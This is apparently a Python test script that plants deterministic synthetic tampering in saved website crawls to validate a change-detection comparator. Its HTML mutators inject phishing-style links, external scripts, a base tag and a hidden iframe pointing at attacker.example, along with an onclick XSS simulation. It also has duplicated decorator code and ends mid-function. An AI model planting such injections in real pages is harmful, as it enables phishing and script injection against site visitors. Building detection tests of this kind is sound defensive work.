#!/usr/bin/env python3
"""scripts/tamper_baseline.py - inject deterministic synthetic changes
into a baseline run dir so the comparator + report pipeline can be
validated end-to-end against sites the operator does not control
(any external URL set whose pages don't drift between runs).

The mutators are markup-agnostic where possible (always-injecting) and
fall back to skipped() where they require specific markup that may not
be present (e.g. mutate_html_form_action_hijack needs a <form action>).
A preflight pass introspects every site BEFORE mutations land and
reports the expected skip set on stderr, so coverage holes for a new
site set are visible immediately rather than buried in the manifest.

# v3.2 - ~60 mutations packed across 19 sites + 1 control

The script bundles related mutations onto the same site so we can probe
50+ distinct attack/regression vectors with only 20 sites available.
Per-site bundles share an `expected` outcome (`should_flag`,
`should_not_flag`, `edge_case`) so per-site verdicts stay unambiguous.

| Site | Bundle                       | Patterns covered |
|------|------------------------------|------------------|
|  1   | visual:drastic               | 80x80 red rect (sanity) |
|  2   | visual:subtle+regions        | small text overlay + 5 scattered 15x15 dots |
|  3   | visual:global                | +20 RGB shift + semi-transparent overlay |
|  4   | visual:tiny_corner           | 5x5 corner (edge_case noise floor) |
|  5   | html:marker_div              | inserted div + title prefix |
|  6   | html:attributes+og           | lang/class/data-* + og:title meta mutation |
|  7   | html:phishing+responsive     | href hijack + form action + img src + picture srcset |
|  8   | html:xss+svg                 | inline/external script + style block + svg injection |
|  9   | html:xss_attrs+canvas        | onclick=alert + inline style + canvas injection |
| 10   | html:url_rewrite+noscript    | <base> + iframe + meta refresh + noscript cloak |
| 11   | html:critical_text           | [CRITICAL] prefix on heading |
| 12   | html:security_downgrade      | SRI strip + rel strip + CSP strip + aria strip |
| 13   | html:seo+hidden              | canonical/noindex + display:none/offscreen |
| 14   | css:real_values              | color + !important + @media breakpoint |
| 15   | css:behavior+supply+pseudo   | --var + @keyframes + @import + @font-face + ::before |
| 16   | css:hide_or_block+at_rule    | display:none + opacity:0 + pointer-events + @supports |
| 17   | css:equiv_edge_cases         | hex→white + property reorder + hex→rgb + rule reorder |
| 18   | js:behavior_changes          | === flip + numeric constant + string literal swap |
| 19   | js:security+sanity+modern    | fetch/eval/setTimeout/doc.write/innerHTML +     |
|      |                              | localStorage/cookie/marker/format + import() +  |
|      |                              | navigator.sendBeacon                             |
| 20   | (CONTROL — untouched)        | should remain `no_changes` |

Mutations carry these expectation classes:
  - `should_flag`   — framework MUST detect this (hard requirement)
  - `should_not_flag` — framework MUST IGNORE this (must not noise)
  - `edge_case`    — framework's behavior is a design choice; document

# Known framework gaps (mutations that may NOT yet be detected)

These probe blind spots the framework hasn't fully closed yet. Listed
so you know where to look in the report:

  * `html:inline_event_handler` (site 9) - `onclick=` / `on*` attributes
    NOT in KEY_ATTRIBUTES. Only the structural element count would
    catch a NEW element with onclick; adding onclick to an EXISTING
    element slips through.
  * `html:inline_style_injection` (site 9) - `style=` attribute
    similarly untracked. CSS injection via inline style escapes both
    the DOM and the CSS file diffs.
  * `html:aria_strip` (site 12) - aria-* attrs not tracked at all.
    A11y regressions are silent.
  * `html:base_tag_injection` (site 10) - `<base>` element add gets
    caught structurally; `<base>` href value CHANGE would not (base
    not in KEY_ATTRIBUTES).
  * `html:style_block_content` (site 8) - inline `<style>` blocks live
    in HTML, not in css/. Caught only via structural <style> count
    change; content mutations within an existing <style> may slip.
  * Inline `<script>` blocks (without src) - JS that lives in HTML
    rather than js/. Caught only via structural <script> count change.
  * HTTP response headers (CSP via header, X-Frame-Options, HSTS,
    Cache-Control, Cookie attrs) - crawler doesn't capture them, so
    they can't be diffed. Site 12 tests CSP via meta tag (the only
    chance the framework has).
  * `js:variable_rename` (not yet tested) - AST-equivalent rename
    will flag via byte diff (false positive in semantic terms).
  * Element reordering with no content change - structure differ
    counts elements per tag; reordering within a tag isn't caught.
  * `css:before_content_injection` (site 16) - `::before` / `::after`
    pseudo-elements bypass the regex parser; only file-level diff sees
    them.
  * `css:supports_injection` (site 16) - `@supports` has nested braces
    that the regex parser can't balance; only file-level diff sees it.
  * `js:import_dynamic` (site 19) - `import()` is not a function
    declaration, so `extract_js_functions` misses it; file-level diff
    catches the append.

# Categories the script does NOT yet probe (potential v5 expansion)

  * Doctype change (quirks-mode trigger)
  * Charset declaration change
  * Cookie attribute changes (HttpOnly/Secure/SameSite)
  * Image swap (favicon, logo) - same filename, different content
  * Time-of-day-dependent content (would need crawler instrumentation)
  * `<link rel="preload"|"prefetch"|"dns-prefetch">` injection
  * `<meta name="viewport">` content manipulation (now tested via OG)
  * `<object>` / `<embed>` injection
  * WebSocket URL swap in JS
  * `postMessage` target origin manipulation
  * Service worker registration changes
  * JSON-LD `<script type="application/ld+json">` manipulation

# Usage

Run inside the dashboard container so the script can write through to
the bind-mounted `/data` (the baseline dirs are owned by `root`
because the dashboard's subprocess writes them as root):

    cat scripts/tamper_baseline.py \\
      | docker exec -i test_ui_with_ai-dashboard-1 python -

Optional env vars:

    AFR_TAMPER_DATE=05-05-2026          # default: latest date dir
    AFR_TAMPER_RUN_ID=01KQT...          # default: resolved via `latest` symlink
    AFR_BASELINE_ROOT=/data/baseline    # default: container path

# After running

DO NOT click "Run all" - that spawns a NEW baseline, overwriting your
tampering. Run these in order on /runs:

    Run current → Run comparator → Run report

Then open /reports and cross-check each site against the manifest's
`expected` field. Mismatches indicate framework gaps:

    expected=should_flag, actual=no_changes  → false negative (BUG)
    expected=should_not_flag, actual=flagged → false positive (NOISE)
    expected=edge_case                       → behavior is design choice;
                                                document the answer
"""

from __future__ import annotations

import json
import os
import re
import sys
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any, Callable

from PIL import Image, ImageDraw

# Default to container path. Override via AFR_BASELINE_ROOT for host runs.
BASELINE_ROOT = Path(os.environ.get("AFR_BASELINE_ROOT", "/data/baseline"))

# Marker strings - searchable in artifacts so you can grep "did the
# mutation actually land?" when debugging.
TAMPER_TAG = "AFR-TAMPER"


# ------------------------------------------------------------------------- #
# Decorator: attach prerequisite tokens to a mutator                        #
# ------------------------------------------------------------------------- #


def _prereqs(*tokens: str):
    """Decorator: declare prerequisite tokens a mutator needs to land.

    Replaces the manually-maintained ``_PREREQS`` dict. Prereqs live
    right next to the function they guard, so they can't drift.
    """
    def _decorator(fn):
        fn.prereqs = list(tokens)
        return fn
    return _decorator


# ------------------------------------------------------------------------- #
# Decorator: attach prerequisite tokens to a mutator                        #
# ------------------------------------------------------------------------- #


def _prereqs(*tokens: str):
    """Decorator: declare prerequisite tokens a mutator needs to land.

    Replaces the manually-maintained ``_PREREQS`` dict. Prereqs live
    right next to the function they guard, so they can't drift.
    """
    def _decorator(fn):
        fn.prereqs = list(tokens)
        return fn
    return _decorator


# ------------------------------------------------------------------------- #
# Data model                                                                #
# ------------------------------------------------------------------------- #


@dataclass
class Mutation:
    """One change made to one file. Goes into the printed manifest."""

    site_id: str
    kind: str  # 'visual' | 'html' | 'css' | 'js'
    pattern: str  # short slug naming the specific mutation pattern
    file: str  # path relative to baseline_root for grep-ability
    expected: str  # 'should_flag' | 'should_not_flag' | 'edge_case'
    description: str
    details: dict[str, Any] = field(default_factory=dict)


# ------------------------------------------------------------------------- #
# Helpers - resolving target run dir + file selection                       #
# ------------------------------------------------------------------------- #


def _is_published_run_name(name: str) -> bool:
    """A run-dir name is "published" iff it doesn't start with `.tmp-` or
    any other hidden/staging prefix. The crawler publishes atomically by
    rename-from-tmp-dir: while a run is in progress the dir is named
    `.tmp-<ULID>` and gets renamed to `<ULID>` only when complete.
    Tampering a `.tmp-` dir would race with the crawler."""
    return not name.startswith(".") and name != "latest"


def resolve_run_dir() -> Path:
    """Find the baseline run dir to tamper.

    Order:
      1. AFR_TAMPER_DATE + AFR_TAMPER_RUN_ID env vars (explicit).
      2. AFR_TAMPER_DATE + `latest` symlink (most-recent-published).
      3. Newest date_dir + its `latest` symlink.

    Filters out `.tmp-...` staging dirs - those are in-progress
    publishes; tampering them would race with the crawler. If a date
    dir contains ONLY a `.tmp-` (no published runs yet), the script
    aborts with a clear message rather than tamper an in-flight crawl.
    """
    date = os.environ.get("AFR_TAMPER_DATE")
    run_id = os.environ.get("AFR_TAMPER_RUN_ID")

    if date is None:
        date_dirs = sorted(
            (p.name for p in BASELINE_ROOT.iterdir() if p.is_dir()),
            reverse=True,
        )
        if not date_dirs:
            sys.exit(f"FATAL: no date dirs under {BASELINE_ROOT}")
        date = date_dirs[0]

    date_root = BASELINE_ROOT / date
    if not date_root.exists():
        sys.exit(f"FATAL: {date_root} does not exist")

    if run_id is None:
        latest = date_root / "latest"
        if latest.is_symlink() or latest.exists():
            resolved = latest.resolve().name
            # Defensive: a `latest` symlink should always point at a
            # published run, but if it points at a `.tmp-` (broken
            # state), refuse rather than tamper an in-flight publish.
            if not _is_published_run_name(resolved):
                sys.exit(
                    f"FATAL: latest symlink at {latest} points at a "
                    f".tmp- staging dir ({resolved}); the crawler may "
                    "still be writing it. Wait for the publish to "
                    "complete (latest should point at a real ULID)."
                )
            run_id = resolved
        else:
            run_dirs = sorted(
                (
                    p.name
                    for p in date_root.iterdir()
                    if p.is_dir() and _is_published_run_name(p.name)
                ),
                reverse=True,
            )
            if not run_dirs:
                # Did we filter out a .tmp-* in progress?
                in_flight = [
                    p.name
                    for p in date_root.iterdir()
                    if p.is_dir() and p.name.startswith(".tmp-")
                ]
                if in_flight:
                    sys.exit(
                        f"FATAL: no PUBLISHED run dirs under {date_root} - "
                        f"only in-flight staging: {in_flight}. The crawler "
                        "is still publishing; wait for it to complete."
                    )
                sys.exit(f"FATAL: no run dirs under {date_root}")
            run_id = run_dirs[0]

    run_dir = date_root / run_id
    if not run_dir.exists():
        sys.exit(f"FATAL: {run_dir} does not exist")
    if not _is_published_run_name(run_dir.name):
        sys.exit(
            f"FATAL: explicit AFR_TAMPER_RUN_ID points at a non-published "
            f"dir ({run_dir.name}); refusing to tamper an in-flight crawl."
        )
    return run_dir


def site_dirs_sorted(run_dir: Path) -> list[Path]:
    """All numerically-named site dirs in numeric order (1, 2, 3, ...)."""
    sites = [p for p in run_dir.iterdir() if p.is_dir() and p.name.isdigit()]
    sites.sort(key=lambda p: int(p.name))
    return sites


def _preview(text: str, max_chars: int = 60) -> str:
    """Whitespace-collapsed, length-capped preview of `text`.

    The crawled HTML on real sites (gov.ie etc.) often has 30+ chars
    of leading indentation whitespace inside `<title>` and heading
    tags. A naive `text[:60]` slice yields a preview that's mostly
    newlines and spaces - useless for an operator audit. This collapses
    any whitespace run to a single space first, then caps the length.
    """
    collapsed = " ".join(text.split())
    if len(collapsed) <= max_chars:
        return collapsed
    return collapsed[:max_chars] + "..."


def relpath(path: Path, run_dir: Path) -> str:
    """Path relative to baseline_root for compact manifest output."""
    return str(path.relative_to(run_dir.parent.parent))


def largest_file(directory: Path, suffix: str) -> Path | None:
    """Largest file with the given suffix, or None if directory is empty."""
    if not directory.exists():
        return None
    candidates = sorted(
        (p for p in directory.iterdir() if p.suffix == suffix),
        key=lambda p: p.stat().st_size,
        reverse=True,
    )
    return candidates[0] if candidates else None


def skipped(site_dir: Path, kind: str, pattern: str, reason: str) -> Mutation:
    """Build a manifest entry for a mutation that couldn't apply."""
    return Mutation(
        site_id=site_dir.name,
        kind=kind,
        pattern=pattern,
        file=str(site_dir),
        expected="should_not_flag",  # nothing was done; comparator should be quiet
        description=f"SKIPPED - {reason}",
        details={"skipped": True, "reason": reason},
    )


# ------------------------------------------------------------------------- #
# Visual mutations (4 patterns)                                             #
# ------------------------------------------------------------------------- #


@_prereqs("screenshot_png")
@_prereqs("screenshot_png")
def mutate_visual_drastic(site_dir: Path, run_dir: Path) -> Mutation:
    """Paint an 80x80 RED rectangle at (10, 10) - clearly visible.

    Should ALWAYS flag. If this doesn't trip visual_changes the SSIM
    threshold is broken or the pixel-diff is dead.
    """
    target = site_dir / "screenshot.png"
    if not target.exists():
        return skipped(site_dir, "visual", "drastic", "screenshot.png missing")
    img = Image.open(target).convert("RGB")
    draw = ImageDraw.Draw(img)
    rect = (10, 10, 90, 90)
    draw.rectangle(rect, fill=(255, 0, 0), outline=(0, 0, 0), width=2)
    img.save(target)
    return Mutation(
        site_id=site_dir.name,
        kind="visual",
        pattern="drastic",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="80x80 red rectangle at (10,10) - massive obvious change",
        details={"rect": list(rect), "rgb": [255, 0, 0]},
    )


@_prereqs("screenshot_png")
@_prereqs("screenshot_png")
def mutate_visual_subtle_text(site_dir: Path, run_dir: Path) -> Mutation:
    """Overlay a small 'TAMPER' label (PIL default font, ~10pt).

    Tests whether SUBTLE visual changes - the kind a real bug might
    introduce, like a single-character price typo - get caught.
    SSIM should drop enough to flag, but only just; failure here means
    the threshold is too loose.
    """
    target = site_dir / "screenshot.png"
    if not target.exists():
        return skipped(site_dir, "visual", "subtle_text", "screenshot.png missing")
    img = Image.open(target).convert("RGB")
    draw = ImageDraw.Draw(img)
    # Default PIL font is ~10pt bitmap - small enough to test sensitivity.
    draw.text((20, 20), "TAMPER", fill=(255, 0, 0))
    img.save(target)
    return Mutation(
        site_id=site_dir.name,
        kind="visual",
        pattern="subtle_text",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Small red text overlay (~10pt) - subtle visual change",
        details={"position": [20, 20], "text": "TAMPER"},
    )


@_prereqs("screenshot_png")
@_prereqs("screenshot_png")
def mutate_visual_color_shift(site_dir: Path, run_dir: Path) -> Mutation:
    """Add +20 to every RGB channel (clipped at 255). Uniform shift.

    SSIM has both LOCAL structure and a luminance term. A uniform shift
    preserves local structure but moves the mean - tests whether the
    luminance term catches it. If this DOESN'T flag, the framework
    will miss "site got darker overall" style regressions.
    """
    target = site_dir / "screenshot.png"
    if not target.exists():
        return skipped(site_dir, "visual", "color_shift", "screenshot.png missing")
    import numpy as np

    img = Image.open(target).convert("RGB")
    arr = np.array(img, dtype=np.int16)
    arr = np.clip(arr + 20, 0, 255).astype(np.uint8)
    Image.fromarray(arr, mode="RGB").save(target)
    return Mutation(
        site_id=site_dir.name,
        kind="visual",
        pattern="color_shift",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="+20 RGB shift across whole image (uniform brightness)",
        details={"delta": "+20 per channel, clipped to 255"},
    )


@_prereqs("screenshot_png")
@_prereqs("screenshot_png")
def mutate_visual_multiple_small_regions(site_dir: Path, run_dir: Path) -> Mutation:
    """Paint 5 small (15x15) red squares scattered across the screenshot.

    Tests whether the contour-area gate aggregates correctly when multiple
    small regions all individually exceed the 50 px² floor (5 × 225 = 1125
    px² total). Each region produces its own contour; the gate fires when
    ANY contour passes the floor, so this MUST flag.
    """
    target = site_dir / "screenshot.png"
    if not target.exists():
        return skipped(
            site_dir, "visual", "multiple_small_regions", "screenshot.png missing"
        )
    img = Image.open(target).convert("RGB")
    draw = ImageDraw.Draw(img)
    positions = [(120, 120), (320, 220), (520, 320), (220, 420), (720, 180)]
    for x, y in positions:
        draw.rectangle((x, y, x + 15, y + 15), fill=(255, 0, 0))
    img.save(target)
    return Mutation(
        site_id=site_dir.name,
        kind="visual",
        pattern="multiple_small_regions",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="5x scattered 15x15 red squares - tests multi-contour aggregation",
        details={"regions": positions, "size_px": 15},
    )


@_prereqs("screenshot_png")
@_prereqs("screenshot_png")
def mutate_visual_transparent_overlay(site_dir: Path, run_dir: Path) -> Mutation:
    """Apply a semi-transparent (alpha=80) red overlay to a 200x200 region.

    Soft-edge mutation: the diff intensity falls off near the boundary,
    testing whether Otsu thresholding still produces a contour above the
    floor. SSIM mean drops noticeably; contour size depends on Otsu's
    cut. Edge case for the visual detector's boundary behavior.
    """
    target = site_dir / "screenshot.png"
    if not target.exists():
        return skipped(
            site_dir, "visual", "transparent_overlay", "screenshot.png missing"
        )
    img = Image.open(target).convert("RGBA")
    overlay = Image.new("RGBA", (200, 200), (255, 0, 0, 80))  # ~31% alpha
    img.paste(overlay, (50, 50), overlay)
    img.convert("RGB").save(target)
    return Mutation(
        site_id=site_dir.name,
        kind="visual",
        pattern="transparent_overlay",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="200x200 semi-transparent red overlay - soft-edge contour test",
        details={"position": [50, 50], "size": 200, "alpha": 80},
    )


@_prereqs("screenshot_png")
@_prereqs("screenshot_png")
def mutate_visual_tiny_corner(site_dir: Path, run_dir: Path) -> Mutation:
    """Paint a 5x5 black square at (0, 0). Minimal visual change.

    Edge case: the threshold/window-size combo might not trip on tiny
    localized changes. If this doesn't flag, the framework can't catch
    a "single icon moved" or "1px border change" regression. Useful for
    calibrating the threshold.
    """
    target = site_dir / "screenshot.png"
    if not target.exists():
        return skipped(site_dir, "visual", "tiny_corner", "screenshot.png missing")
    img = Image.open(target).convert("RGB")
    draw = ImageDraw.Draw(img)
    draw.rectangle((0, 0, 5, 5), fill=(0, 0, 0))
    img.save(target)
    return Mutation(
        site_id=site_dir.name,
        kind="visual",
        pattern="tiny_corner",
        file=relpath(target, run_dir),
        expected="edge_case",
        description="5x5 black square at (0,0) - probes minimum detectable size",
        details={
            "rect": [0, 0, 5, 5],
            "note": (
                "5x5 painted region spreads to ~64 px² after SSIM-window "
                "smoothing - sits just above the default contour-area "
                "floor (50 px²) so this typically DOES flag at default "
                "settings. Bump AFR_VISUAL_MIN_CONTOUR_AREA above 64 to "
                "treat it as noise."
            ),
        },
    )


# ------------------------------------------------------------------------- #
# HTML mutations (7 patterns)                                               #
# ------------------------------------------------------------------------- #


@_prereqs("index_html")
@_prereqs("index_html")
def mutate_html_marker_div(site_dir: Path, run_dir: Path) -> Mutation:
    """Insert a marker <div> before </body> + prepend [TAMPERED] to <title>.

    Two structural changes - DOM differ has to detect both insertion
    (new element) AND text mutation (title content changed).
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "marker_div", "index.html missing")
    html = target.read_text(encoding="utf-8")
    div = f'<div data-afr-tamper="1">[{TAMPER_TAG}-MARKER] injected</div>'
    if "</body>" in html:
        html = html.replace("</body>", f"{div}</body>", 1)
    else:
        html += div
    title_pat = re.compile(r"(<title[^>]*>)([^<]*)(</title>)", re.IGNORECASE)
    m = title_pat.search(html)
    title_change = None
    if m:
        original = m.group(2)
        new_title = f"[TAMPERED] {original}"
        html = html[: m.start()] + m.group(1) + new_title + m.group(3) + html[m.end() :]
        title_change = {
            "original_preview": _preview(original, 60),
            "prefixed": "[TAMPERED]",
        }
    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="marker_div_and_title",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Inserted marker <div> + prefixed <title>",
        details={"div_inserted": True, "title": title_change},
    )


@_prereqs("index_html")
def mutate_html_attributes(site_dir: Path, run_dir: Path) -> Mutation:
    """Change attribute values without altering DOM structure.

    Mutations:
      1. <html lang="en"> → <html lang="fr">  (language regression)
      2. Add data-afr-tamper="1" to <body>
      3. Append a class to first element with class=

    Edge case: many DOM differs only check tags/structure and ignore
    attribute drift. If this doesn't flag, an attacker could change
    `<form action>` or `<a href>` and slip past detection.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "attributes", "index.html missing")
    html = target.read_text(encoding="utf-8")
    changes = {}

    # 1. Flip lang
    new_html, n = re.subn(
        r'(<html[^>]*\blang=)"([^"]*)"',
        lambda m: f'{m.group(1)}"fr"',
        html,
        count=1,
    )
    if n:
        html = new_html
        changes["lang"] = "en → fr (or whatever was there → fr)"

    # 2. Add data-afr-tamper to <body>
    new_html, n = re.subn(
        r"<body([^>]*)>",
        r'<body data-afr-tamper="1"\1>',
        html,
        count=1,
    )
    if n:
        html = new_html
        changes["body_data_attr"] = 'added data-afr-tamper="1"'

    # 3. Append a class to first class= attribute
    new_html, n = re.subn(
        r'(\bclass=")([^"]*)"',
        lambda m: f'{m.group(1)}{m.group(2)} afr-tamper-class"',
        html,
        count=1,
    )
    if n:
        html = new_html
        changes["class_appended"] = "afr-tamper-class"

    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="attributes",
        file=relpath(target, run_dir),
        expected="edge_case",
        description="Attribute-only changes (lang, data-*, class)",
        details=changes,
    )


@_prereqs("index_html", "a_href")
def mutate_html_href_hijack(site_dir: Path, run_dir: Path) -> Mutation:
    """Change first <a href="..."> to point to an attacker URL. Phishing sim.

    SECURITY-CRITICAL. If the framework misses this, link-hijacking
    attacks (defacement, phishing) won't be caught. The diff is one
    attribute value swap - tests if href changes are tracked.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "href_hijack", "index.html missing")
    html = target.read_text(encoding="utf-8")
    pat = re.compile(r'(<a\s[^>]*\bhref=)"([^"]*)"', re.IGNORECASE)
    m = pat.search(html)
    if not m:
        return skipped(site_dir, "html", "href_hijack", "no <a href> found")
    original = m.group(2)
    new_href = "https://attacker.example/afr-tamper-phish"
    html = html[: m.start()] + f'{m.group(1)}"{new_href}"' + html[m.end() :]
    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="href_hijack",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Hijacked first <a href> to attacker URL (phishing sim)",
        details={"original": _preview(original, 120), "new": new_href},
    )


@_prereqs("index_html")
@_prereqs("index_html")
def mutate_html_script_injection(site_dir: Path, run_dir: Path) -> Mutation:
    """Inject a <script> tag into <body>. XSS sim.

    SECURITY-CRITICAL. Real XSS attacks insert <script> tags. If the
    framework misses an unexpected <script> tag, supply-chain attacks
    (e.g., malicious analytics injection) won't be caught.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "script_injection", "index.html missing")
    html = target.read_text(encoding="utf-8")
    inline = (
        f'<script data-afr-tamper="1">console.log("{TAMPER_TAG}-XSS-SIM");</script>'
    )
    external = (
        '<script src="https://attacker.example/afr-tamper.js" '
        'data-afr-tamper="1"></script>'
    )
    if "</body>" in html:
        html = html.replace("</body>", f"{inline}</body>", 1)
    else:
        html += inline
    if "</head>" in html:
        html = html.replace("</head>", f"{external}</head>", 1)
    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="script_injection",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Injected inline <script> in body + external <script> in head",
        details={"inline": True, "external_src": "attacker.example"},
    )


@_prereqs("index_html")
@_prereqs("index_html")
def mutate_html_meta_tags(site_dir: Path, run_dir: Path) -> Mutation:
    """Mutate SEO-critical meta tags: canonical URL + add noindex.

    Real-world: an attacker (or a buggy deploy) could change the
    canonical URL (poisoning search results) or add noindex (delisting
    the page). These are invisible to a human eyeballing the page but
    catastrophic for SEO. Edge case for the comparator.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "meta_tags", "index.html missing")
    html = target.read_text(encoding="utf-8")
    changes = {}

    # 1. Mutate canonical link
    new_html, n = re.subn(
        r'(<link[^>]*\brel=["\']canonical["\'][^>]*\bhref=)["\']([^"\']*)["\']',
        lambda m: f'{m.group(1)}"https://attacker.example/canonical-tamper"',
        html,
        count=1,
        flags=re.IGNORECASE,
    )
    if n:
        html = new_html
        changes["canonical"] = "→ https://attacker.example/canonical-tamper"

    # 2. Inject noindex robots meta
    noindex = '<meta name="robots" content="noindex,nofollow" data-afr-tamper="1">'
    if "</head>" in html and noindex not in html:
        html = html.replace("</head>", f"{noindex}</head>", 1)
        changes["robots_added"] = "noindex,nofollow"

    target.write_text(html, encoding="utf-8")
    if not changes:
        return skipped(site_dir, "html", "meta_tags", "no canonical/head found")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="meta_tags",
        file=relpath(target, run_dir),
        expected="edge_case",
        description="Mutated canonical + injected noindex (SEO-critical, visually invisible)",
        details=changes,
    )


@_prereqs("index_html")
@_prereqs("index_html")
def mutate_html_hidden_content(site_dir: Path, run_dir: Path) -> Mutation:
    """Inject content invisible to humans: display:none + offscreen.

    Edge case: the visual differ won't see this (SSIM = 1.0). The DOM
    differ should catch it. Tests separation of "what changed" vs.
    "what changed visibly" - real-world threats include hidden
    keyword-stuffing for SEO and cloaked phishing payloads.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "hidden_content", "index.html missing")
    html = target.read_text(encoding="utf-8")
    hidden_blocks = (
        '<div data-afr-tamper="1" style="display:none">'
        f"[{TAMPER_TAG}-HIDDEN-DISPLAY-NONE]"
        "</div>"
        '<div data-afr-tamper="1" '
        'style="position:absolute;left:-9999px;top:-9999px">'
        f"[{TAMPER_TAG}-HIDDEN-OFFSCREEN]"
        "</div>"
    )
    if "</body>" in html:
        html = html.replace("</body>", f"{hidden_blocks}</body>", 1)
    else:
        html += hidden_blocks
    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="hidden_content",
        file=relpath(target, run_dir),
        expected="edge_case",
        description="Injected display:none + offscreen divs (DOM yes, visual no)",
        details={"display_none": True, "offscreen": True},
    )


@_prereqs("index_html", "h1_h2_h3")
def mutate_html_critical_text(site_dir: Path, run_dir: Path) -> Mutation:
    """Change visible heading text: prepend [CRITICAL].

    Simulates the most damaging real-world mutation: text content that
    misleads users (changed phone number, swapped price, fake notice).
    Visible AND structural - both differs should catch it.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "critical_text", "index.html missing")
    html = target.read_text(encoding="utf-8")
    pat = re.compile(r"(<h[1-3][^>]*>)([^<]+)(</h[1-3]>)", re.IGNORECASE)
    m = pat.search(html)
    if not m:
        return skipped(site_dir, "html", "critical_text", "no <h1>/<h2>/<h3>")
    original = m.group(2).strip()
    new_text = f"[CRITICAL-{TAMPER_TAG}] {m.group(2)}"
    html = html[: m.start()] + m.group(1) + new_text + m.group(3) + html[m.end() :]
    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="critical_text",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Prepended [CRITICAL] to first heading (visible text change)",
        details={"original": _preview(original, 80), "tag": m.group(1)},
    )


@_prereqs("index_html", "a_with_attrs")
@_prereqs("index_html", "a_with_attrs")
def mutate_html_inline_event_handler(site_dir: Path, run_dir: Path) -> Mutation:
    """Inject `onclick="alert('XSS')"` into the first <a> tag.

    Real XSS pattern: an attacker who controls one attribute can run
    arbitrary JS without injecting a <script> tag. The DOM differ
    currently does NOT track inline event handlers - this mutation
    documents that gap. Should_flag in INTENT (XSS-class), but expect
    a false negative until the framework grows on* attribute tracking.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "inline_event_handler", "index.html missing")
    html = target.read_text(encoding="utf-8")
    new_html, n = re.subn(
        r"(<a\s)([^>]*>)",
        r"\1onclick=\"alert('AFR-TAMPER-XSS')\" \2",
        html,
        count=1,
    )
    if n == 0:
        return skipped(site_dir, "html", "inline_event_handler", "no <a> tag found")
    target.write_text(new_html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="inline_event_handler",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Injected onclick=alert() on first <a> - XSS-via-attribute",
        details={"attribute": "onclick", "value": "alert('AFR-TAMPER-XSS')"},
    )


@_prereqs("index_html", "h1_or_h2")
@_prereqs("index_html", "h1_or_h2")
def mutate_html_inline_style_injection(site_dir: Path, run_dir: Path) -> Mutation:
    """Inject `style="background:red"` into the first element with no style.

    Inline styles bypass the CSS file diff entirely - they live in HTML
    attributes, which most DOM differs (this one included pre-fix) don't
    extract. Documents the gap.
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "inline_style_injection", "index.html missing")
    html = target.read_text(encoding="utf-8")
    # Add style="..." to the first <h1> or <h2> we find that doesn't
    # already have a style= attribute.
    new_html, n = re.subn(
        r"(<h[12])(\s[^>]*?)?>",
        r'\1\2 style="background:red;color:white;padding:8px">',
        html,
        count=1,
    )
    if n == 0:
        return skipped(site_dir, "html", "inline_style_injection", "no <h1>/<h2> found")
    target.write_text(new_html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="inline_style_injection",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Injected inline style on first <h1>/<h2> - bypasses CSS diff",
        details={"style": "background:red;color:white;padding:8px"},
    )


@_prereqs("index_html", "head_open")
@_prereqs("index_html", "head_open")
def mutate_html_base_tag_injection(site_dir: Path, run_dir: Path) -> Mutation:
    """Inject `<base href="https://attacker.example/">` into <head>.

    Devastating attack: the <base> tag rewrites EVERY relative URL on
    the page (links, images, scripts, stylesheets) to be relative to
    the attacker. A clean-looking gov.ie page suddenly serves images
    and scripts from attacker.example. The DOM differ tracks <link>
    href and individual element src/href, but `<base>` itself isn't
    in KEY_ATTRIBUTES. The structural element-count check WILL detect
    a new <base> tag (count goes from 0 to 1).
    """
    target = site_dir / "index.html"
    if not target.exists():
        return skipped(site_dir, "html", "base_tag_injection", "index.html missing")
    html = target.read_text(encoding="utf-8")
    base_tag = '<base href="https://attacker.example/" data-afr-tamper="1">'
    if "<head>" in html:
        # Insert right after <head> so it's the FIRST head child.
        html = html.replace("<head>", f"<head>{base_tag}", 1)
    else:
        return skipped(site_dir, "html", "base_tag_injection", "no <head> found")
    target.write_text(html, encoding="utf-8")
    return Mutation(
        site_id=site_dir.name,
        kind="html",
        pattern="base_tag_injection",
        file=relpath(target, run_dir),
        expected="should_flag",
        description="Injected <base href=attacker> - rewrites ALL relative URLs",
        details={"base_href": "https://attacker.example/"},
    )


@_prereqs("index_html")
@_prereqs("index_html")
def mutate_html_iframe_injection(site_dir: Path, run_dir: Path) -> Mutation:
    """Inject a hidden `<iframe src="https://attacker.example/spy">`.

    Drive-by tracking / clickjacking vector. A 1x1 invisible iframe
